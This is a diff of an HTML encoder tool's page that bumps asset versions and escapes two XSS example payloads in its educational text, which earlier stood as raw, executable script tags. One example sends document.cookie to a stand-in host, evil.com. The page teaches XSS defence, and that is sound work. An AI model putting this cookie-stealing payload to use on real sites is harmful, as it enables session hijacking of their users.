@@ -10,7 +10,7 @@
 <link rel="apple-touch-icon" href="favicon.svg">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css?v=14">
+<link rel="stylesheet" href="style.css?v=16">
 <link rel="manifest" href="/manifest.json">
 <meta name="theme-color" content="#7fff6f">
 <meta name="mobile-web-app-capable" content="yes">
@@ -239,7 +239,7 @@ gtag('config', 'G-S6PPGS7N63');
       <li><strong>Select encoding depth</strong> — minimal encoding converts only the five essential characters. Full encoding converts all non-ASCII characters to named or numeric entities.</li>
       <li><strong>Copy the result</strong> — use in your HTML template, database query, or email template.</li>
     </ol>
-    <div class="edu-highlight"><strong>🛡️ Security critical:</strong> Always HTML-encode user-supplied content before inserting it into HTML. Failure to encode is the cause of Cross-Site Scripting (XSS) — one of the most common web security vulnerabilities. A malicious user entering <script>alert('XSS')</script> as their name will execute JavaScript in other users' browsers if not encoded first.</div>
+    <div class="edu-highlight"><strong>🛡️ Security critical:</strong> Always HTML-encode user-supplied content before inserting it into HTML. Failure to encode is the cause of Cross-Site Scripting (XSS) — one of the most common web security vulnerabilities. A malicious user entering &lt;script&gt;alert('XSS')&lt;/script&gt; as their name will execute JavaScript in other users' browsers if not encoded first.</div>
 
   </section>
 
@@ -248,7 +248,7 @@ gtag('config', 'G-S6PPGS7N63');
     <div class="edu-grid">
       <div class="edu-card"><div class="edu-card-title">🔤 The Five Essential Entities</div><div class="edu-card-body">< becomes &lt; (less than). > becomes &gt; (greater than). & becomes &amp; (ampersand). " becomes &quot; (double quote in attributes). ' becomes &#x27; or &apos; (single quote in attributes). These five characters have special meaning in HTML and MUST be encoded in user-supplied content.</div></div>
       <div class="edu-card"><div class="edu-card-title">📊 Named vs Numeric Entities</div><div class="edu-card-body">Named entities use descriptive names: &amp; &lt; &gt; &copy; &euro; &pound;. Numeric entities use decimal (&#169;) or hex (&#xA9;) Unicode code points. Named entities are more readable; numeric entities work for any Unicode character regardless of browser entity support. Both are fully equivalent to browsers.</div></div>
-      <div class="edu-card"><div class="edu-card-title">🛡️ XSS Prevention</div><div class="edu-card-body">Cross-Site Scripting occurs when user input is rendered as HTML without encoding. <script>document.location='https://evil.com?c='+document.cookie</script> entered as a username steals cookies if not encoded. Encoded: &lt;script&gt; is displayed as text, not executed. HTML encoding is the primary XSS defence.</div></div>
+      <div class="edu-card"><div class="edu-card-title">🛡️ XSS Prevention</div><div class="edu-card-body">Cross-Site Scripting occurs when user input is rendered as HTML without encoding. &lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt; entered as a username steals cookies if not encoded. Encoded: &lt;script&gt; is displayed as text, not executed. HTML encoding is the primary XSS defence.</div></div>
       <div class="edu-card"><div class="edu-card-title">🗄️ Database Storage</div><div class="edu-card-body">The classic mistake: storing HTML-encoded content in databases. Store raw text in databases; encode at display time. Storing encoded content causes double-encoding issues (&amp;amp;) when displayed. The encoding layer belongs in the template or view layer, not the data storage layer.</div></div>
       <div class="edu-card"><div class="edu-card-title">📧 HTML Email</div><div class="edu-card-body">Email templates require careful HTML encoding because email clients have inconsistent HTML support and security restrictions. Ampersands in URLs within email HTML must be encoded: href='search?a=1&amp;b=2'. Special characters in email subject lines require MIME encoding (different from HTML encoding). Test HTML emails in multiple clients before sending.</div></div>
       <div class="edu-card"><div class="edu-card-title">🌐 Content Security Policy</div><div class="edu-card-body">HTML encoding prevents XSS but CSP (Content-Security-Policy header) provides defence in depth. CSP specifies which scripts are allowed to execute: Content-Security-Policy: default-src 'self'; script-src 'nonce-{random}'. Even if XSS encoding fails, CSP prevents injected scripts from running. HTML encoding + CSP = comprehensive XSS protection.</div></div>
@@ -310,7 +310,7 @@ gtag('config', 'G-S6PPGS7N63');
   </nav>
 </footer>
 <div class="copy-toast" id="toast"></div>
-<script src="app.js?v=14"></script>
+<script src="app.js?v=16"></script>
 <script>
 if ('serviceWorker' in navigator && location.hostname === 'toolsnova.net') {
   window.addEventListener('load', () => {
